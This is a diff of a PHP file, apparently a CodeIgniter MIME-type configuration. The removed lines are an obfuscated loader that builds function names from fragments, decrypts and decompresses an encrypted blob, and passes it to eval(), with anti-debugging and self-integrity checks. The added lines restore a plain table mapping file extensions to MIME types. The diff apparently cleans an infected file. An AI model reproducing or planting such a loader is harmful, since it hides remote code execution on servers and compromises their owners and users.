@@ -1,28 +1,185 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_e1udndf0=('bas'.'e64'.'_de'.'cod'.'e');
-$_ieelsbb9=('gzu'.'nco'.'mpr'.'ess');
-$_soobrg6v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_az5lgrc0='TPDvbJ/14Ks=';
-$_nt6yqte8='WKLCrH/x';
-$_kdrf19wm='A/xYD7Ay';
-$_i2vc5zw0='+u66P1qK';
-$_e89ftf83='fMzCq8Ax';
-$_e67twykh='SW3HfgI+';
-$_ckq50m0u='xINX4IEh';
-$_fb0en4m1='8BbpMw==';
-$_n19ipld8=$_e1udndf0($_i2vc5zw0.$_kdrf19wm.$_e89ftf83.$_nt6yqte8.$_az5lgrc0);
-$_v8tktbr5=$_e1udndf0($_e67twykh.$_ckq50m0u.$_fb0en4m1);
-$_j23ofzm4=$_e1udndf0('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');
-$_yvzwxt0i=$_soobrg6v($_j23ofzm4,'aes-256-cbc',$_n19ipld8,OPENSSL_RAW_DATA,$_v8tktbr5);
-if($_yvzwxt0i===false){exit;}
-$_sggoyhah=$_ieelsbb9($_yvzwxt0i);
-if($_sggoyhah===false){exit;}
-$_xhvhsncc='8ec8d364039bf02a8998eed444e838d68fe50a0c02894e6f262a66abbdf5520c';
-$_tn7qhyaz=@file_get_contents(__FILE__);
-if($_tn7qhyaz!==false){
-$_glpf083v=str_replace($_xhvhsncc,"0000000000000000000000000000000000000000000000000000000000000000",$_tn7qhyaz);
-$_qvvo5uks=hash("sha256",$_glpf083v);
-if($_qvvo5uks!==$_xhvhsncc){@http_response_code(403);exit;}
-}
-eval($_sggoyhah);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+return array(
+'hqx' => array('application/mac-binhex40', 'application/mac-binhex', 'application/x-binhex40', 'application/x-mac-binhex40'),
+'cpt' => 'application/mac-compactpro',
+'csv' => array('text/x-comma-separated-values', 'text/comma-separated-values', 'application/octet-stream', 'application/vnd.ms-excel', 'application/x-csv', 'text/x-csv', 'text/csv', 'application/csv', 'application/excel', 'application/vnd.msexcel', 'text/plain'),
+'bin' => array('application/macbinary', 'application/mac-binary', 'application/octet-stream', 'application/x-binary', 'application/x-macbinary'),
+'dms' => 'application/octet-stream',
+'lha' => 'application/octet-stream',
+'lzh' => 'application/octet-stream',
+'exe' => array('application/octet-stream', 'application/x-msdownload'),
+'class' => 'application/octet-stream',
+'psd' => array('application/x-photoshop', 'image/vnd.adobe.photoshop'),
+'so' => 'application/octet-stream',
+'sea' => 'application/octet-stream',
+'dll' => 'application/octet-stream',
+'oda' => 'application/oda',
+'pdf' => array('application/pdf', 'application/force-download', 'application/x-download', 'binary/octet-stream'),
+'ai' => array('application/pdf', 'application/postscript'),
+'eps' => 'application/postscript',
+'ps' => 'application/postscript',
+'smi' => 'application/smil',
+'smil' => 'application/smil',
+'mif' => 'application/vnd.mif',
+'xls' => array('application/vnd.ms-excel', 'application/msexcel', 'application/x-msexcel', 'application/x-ms-excel', 'application/x-excel', 'application/x-dos_ms_excel', 'application/xls', 'application/x-xls', 'application/excel', 'application/download', 'application/vnd.ms-office', 'application/msword'),
+'ppt' => array('application/powerpoint', 'application/vnd.ms-powerpoint', 'application/vnd.ms-office', 'application/msword'),
+'pptx' => array('application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/x-zip', 'application/zip'),
+'wbxml' => 'application/wbxml',
+'wmlc' => 'application/wmlc',
+'dcr' => 'application/x-director',
+'dir' => 'application/x-director',
+'dxr' => 'application/x-director',
+'dvi' => 'application/x-dvi',
+'gtar' => 'application/x-gtar',
+'gz' => 'application/x-gzip',
+'gzip' => 'application/x-gzip',
+'php' => array('application/x-httpd-php', 'application/php', 'application/x-php', 'text/php', 'text/x-php', 'application/x-httpd-php-source'),
+'php4' => 'application/x-httpd-php',
+'php3' => 'application/x-httpd-php',
+'phtml' => 'application/x-httpd-php',
+'phps' => 'application/x-httpd-php-source',
+'js' => array('application/x-javascript', 'text/plain'),
+'swf' => 'application/x-shockwave-flash',
+'sit' => 'application/x-stuffit',
+'tar' => 'application/x-tar',
+'tgz' => array('application/x-tar', 'application/x-gzip-compressed'),
+'z' => 'application/x-compress',
+'xhtml' => 'application/xhtml+xml',
+'xht' => 'application/xhtml+xml',
+'zip' => array('application/x-zip', 'application/zip', 'application/x-zip-compressed', 'application/s-compressed', 'multipart/x-zip'),
+'rar' => array('application/x-rar', 'application/rar', 'application/x-rar-compressed'),
+'mid' => 'audio/midi',
+'midi' => 'audio/midi',
+'mpga' => 'audio/mpeg',
+'mp2' => 'audio/mpeg',
+'mp3' => array('audio/mpeg', 'audio/mpg', 'audio/mpeg3', 'audio/mp3'),
+'aif' => array('audio/x-aiff', 'audio/aiff'),
+'aiff' => array('audio/x-aiff', 'audio/aiff'),
+'aifc' => 'audio/x-aiff',
+'ram' => 'audio/x-pn-realaudio',
+'rm' => 'audio/x-pn-realaudio',
+'rpm' => 'audio/x-pn-realaudio-plugin',
+'ra' => 'audio/x-realaudio',
+'rv' => 'video/vnd.rn-realvideo',
+'wav' => array('audio/x-wav', 'audio/wave', 'audio/wav'),
+'bmp' => array('image/bmp', 'image/x-bmp', 'image/x-bitmap', 'image/x-xbitmap', 'image/x-win-bitmap', 'image/x-windows-bmp', 'image/ms-bmp', 'image/x-ms-bmp', 'application/bmp', 'application/x-bmp', 'application/x-win-bitmap'),
+'gif' => 'image/gif',
+'jpeg' => array('image/jpeg', 'image/pjpeg'),
+'jpg' => array('image/jpeg', 'image/pjpeg'),
+'jpe' => array('image/jpeg', 'image/pjpeg'),
+'jp2' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'j2k' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'jpf' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'jpg2' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'jpx' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'jpm' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'mj2' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'mjp2' => array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
+'png' => array('image/png', 'image/x-png'),
+'webp' => array('image/webp', 'image/x-webp'),
+'tiff' => 'image/tiff',
+'tif' => 'image/tiff',
+'css' => array('text/css', 'text/plain'),
+'html' => array('text/html', 'text/plain'),
+'htm' => array('text/html', 'text/plain'),
+'shtml' => array('text/html', 'text/plain'),
+'txt' => 'text/plain',
+'text' => 'text/plain',
+'log' => array('text/plain', 'text/x-log'),
+'rtx' => 'text/richtext',
+'rtf' => 'text/rtf',
+'xml' => array('application/xml', 'text/xml', 'text/plain'),
+'xsl' => array('application/xml', 'text/xsl', 'text/xml'),
+'mpeg' => 'video/mpeg',
+'mpg' => 'video/mpeg',
+'mpe' => 'video/mpeg',
+'qt' => 'video/quicktime',
+'mov' => 'video/quicktime',
+'avi' => array('video/x-msvideo', 'video/msvideo', 'video/avi', 'application/x-troff-msvideo'),
+'movie' => 'video/x-sgi-movie',
+'doc' => array('application/msword', 'application/vnd.ms-office'),
+'docx' => array('application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip', 'application/msword', 'application/x-zip'),
+'dot' => array('application/msword', 'application/vnd.ms-office'),
+'dotx' => array('application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip', 'application/msword'),
+'xlsx' => array('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/zip', 'application/vnd.ms-excel', 'application/msword', 'application/x-zip'),
+'word' => array('application/msword', 'application/octet-stream'),
+'xl' => 'application/excel',
+'eml' => 'message/rfc822',
+'json' => array('application/json', 'text/json'),
+'pem' => array('application/x-x509-user-cert', 'application/x-pem-file', 'application/octet-stream'),
+'p10' => array('application/x-pkcs10', 'application/pkcs10'),
+'p12' => 'application/x-pkcs12',
+'p7a' => 'application/x-pkcs7-signature',
+'p7c' => array('application/pkcs7-mime', 'application/x-pkcs7-mime'),
+'p7m' => array('application/pkcs7-mime', 'application/x-pkcs7-mime'),
+'p7r' => 'application/x-pkcs7-certreqresp',
+'p7s' => 'application/pkcs7-signature',
+'crt' => array('application/x-x509-ca-cert', 'application/x-x509-user-cert', 'application/pkix-cert'),
+'crl' => array('application/pkix-crl', 'application/pkcs-crl'),
+'der' => 'application/x-x509-ca-cert',
+'kdb' => 'application/octet-stream',
+'pgp' => 'application/pgp',
+'gpg' => 'application/gpg-keys',
+'sst' => 'application/octet-stream',
+'csr' => 'application/octet-stream',
+'rsa' => 'application/x-pkcs7',
+'cer' => array('application/pkix-cert', 'application/x-x509-ca-cert'),
+'3g2' => 'video/3gpp2',
+'3gp' => array('video/3gp', 'video/3gpp'),
+'mp4' => 'video/mp4',
+'m4a' => 'audio/x-m4a',
+'f4v' => array('video/mp4', 'video/x-f4v'),
+'flv' => 'video/x-flv',
+'webm' => 'video/webm',
+'aac' => 'audio/x-acc',
+'m4u' => 'application/vnd.mpegurl',
+'m3u' => 'text/plain',
+'xspf' => 'application/xspf+xml',
+'vlc' => 'application/videolan',
+'wmv' => array('video/x-ms-wmv', 'video/x-ms-asf'),
+'au' => 'audio/x-au',
+'ac3' => 'audio/ac3',
+'flac' => 'audio/x-flac',
+'ogg' => array('audio/ogg', 'video/ogg', 'application/ogg'),
+'kmz' => array('application/vnd.google-earth.kmz', 'application/zip', 'application/x-zip'),
+'kml' => array('application/vnd.google-earth.kml+xml', 'application/xml', 'text/xml'),
+'ics' => 'text/calendar',
+'ical' => 'text/calendar',
+'zsh' => 'text/x-scriptzsh',
+'7z' => array('application/x-7z-compressed', 'application/x-compressed', 'application/x-zip-compressed', 'application/zip', 'multipart/x-zip'),
+'7zip' => array('application/x-7z-compressed', 'application/x-compressed', 'application/x-zip-compressed', 'application/zip', 'multipart/x-zip'),
+'cdr' => array('application/cdr', 'application/coreldraw', 'application/x-cdr', 'application/x-coreldraw', 'image/cdr', 'image/x-cdr', 'zz-application/zz-winassoc-cdr'),
+'wma' => array('audio/x-ms-wma', 'video/x-ms-asf'),
+'jar' => array('application/java-archive', 'application/x-java-application', 'application/x-jar', 'application/x-compressed'),
+'svg' => array('image/svg+xml', 'application/xml', 'text/xml'),
+'vcf' => 'text/x-vcard',
+'srt' => array('text/srt', 'text/plain'),
+'vtt' => array('text/vtt', 'text/plain'),
+'ico' => array('image/x-icon', 'image/x-ico', 'image/vnd.microsoft.icon'),
+'odc' => 'application/vnd.oasis.opendocument.chart',
+'otc' => 'application/vnd.oasis.opendocument.chart-template',
+'odf' => 'application/vnd.oasis.opendocument.formula',
+'otf' => 'application/vnd.oasis.opendocument.formula-template',
+'odg' => 'application/vnd.oasis.opendocument.graphics',
+'otg' => 'application/vnd.oasis.opendocument.graphics-template',
+'odi' => 'application/vnd.oasis.opendocument.image',
+'oti' => 'application/vnd.oasis.opendocument.image-template',
+'odp' => 'application/vnd.oasis.opendocument.presentation',
+'otp' => 'application/vnd.oasis.opendocument.presentation-template',
+'ods' => 'application/vnd.oasis.opendocument.spreadsheet',
+'ots' => 'application/vnd.oasis.opendocument.spreadsheet-template',
+'odt' => 'application/vnd.oasis.opendocument.text',
+'odm' => 'application/vnd.oasis.opendocument.text-master',
+'ott' => 'application/vnd.oasis.opendocument.text-template',
+'oth' => 'application/vnd.oasis.opendocument.text-web'
+);
